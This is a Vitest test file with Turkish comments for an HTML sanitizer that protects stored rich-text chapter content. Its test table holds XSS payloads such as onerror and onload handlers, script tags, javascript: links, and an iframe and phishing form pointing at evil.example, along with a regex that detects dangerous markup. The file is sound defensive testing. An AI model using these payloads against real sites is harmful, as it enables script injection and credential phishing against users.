import { describe, it, expect } from 'vitest'
import { sanitizeHtml } from '@/lib/sanitize'

/**
 * Bu testler 23 Eyl 2026'da doğrulanan gerçek bir açığı bekliyor: bölüm
 * içeriği ham HTML olarak saklanır ve editör tek yazma yolu değildir —
 * kullanıcı kendi oturumuyla doğrudan PostgREST'e yazabilir. Dolayısıyla
 * aşağıdaki yükler veritabanına GİREBİLİR; render anında düşmeleri gerekir.
 */

const DANGEROUS = /onerror|onload|onclick|javascript:|<script|<iframe|<form|<input/i

describe('sanitizeHtml — saldırı yükleri', () => {
  it.each([
    ['img onerror', '<p>ok</p><img src=x onerror="window.__X__=1">'],
    ['svg onload', '<svg onload="window.__X__=1"></svg>'],
    ['iframe', '<iframe src="https://evil.example"></iframe>'],
    ['javascript: bağlantısı', '<a href="javascript:alert(1)">tıkla</a>'],
    ['script etiketi', '<script>window.__X__=1</script>'],
    ['form + input (kimlik avı)', '<form action="https://evil.example"><input name="pw"></form>'],
    ['olay yakalayıcılı div', '<div onclick="window.__X__=1">tıkla</div>'],
  ])('%s temizlenir', (_name, payload) => {
    expect(sanitizeHtml(payload)).not.toMatch(DANGEROUS)
  })

  it('boş ve null girdi patlamaz', () => {
    expect(sanitizeHtml(null)).toBe('')
    expect(sanitizeHtml(undefined)).toBe('')
    expect(sanitizeHtml('')).toBe('')
  })
})

describe('sanitizeHtml — meşru TipTap içeriği', () => {
  const content =
    '<h2>Bölüm 1</h2><p><strong>kalın</strong> ve <em>italik</em> ve <u>altı çizili</u></p>' +
    '<blockquote>alıntı</blockquote><ul><li>madde</li></ul>' +
    '<a href="https://ornek.com" target="_blank" rel="noopener">bağlantı</a>' +
    '<img src="https://ornek.com/a.png" alt="görsel">'

  it('biçimlendirme etiketlerini korur', () => {
    const out = sanitizeHtml(content)
    for (const tag of ['<h2>', '<strong>', '<em>', '<u>', '<blockquote>', '<li>']) {
      expect(out).toContain(tag)
    }
  })

  it('güvenli bağlantı ve görselleri korur', () => {
    const out = sanitizeHtml(content)
    expect(out).toContain('href="https://ornek.com"')
    expect(out).toContain('<img')
    expect(out).toContain('alt="görsel"')
  })

  it('Türkçe karakterleri bozmaz', () => {
    expect(sanitizeHtml('<p>şğüöçİIı — “tırnak”</p>')).toContain('şğüöçİIı')
  })
})

describe('sanitizeHtml — style ve bağlantı', () => {
  it('TipTap hizalama ve rengini korur, sayfa düzenini bozan CSS düşer', () => {
    const out = sanitizeHtml('<p style="text-align: center; position: fixed; inset: 0; z-index: 9999">x</p>')
    expect(out).toContain('text-align:center')
    expect(out).not.toMatch(/position|z-index|inset/)
  })

  it('yeni sekmede açılan bağlantıya noopener eklenir', () => {
    expect(sanitizeHtml('<a href="https://ornek.com" target="_blank">x</a>')).toContain('rel="noopener noreferrer"')
  })

  it('protokolsüz dış adres düşer', () => {
    expect(sanitizeHtml('<a href="//evil.example">x</a>')).not.toContain('evil.example')
  })
})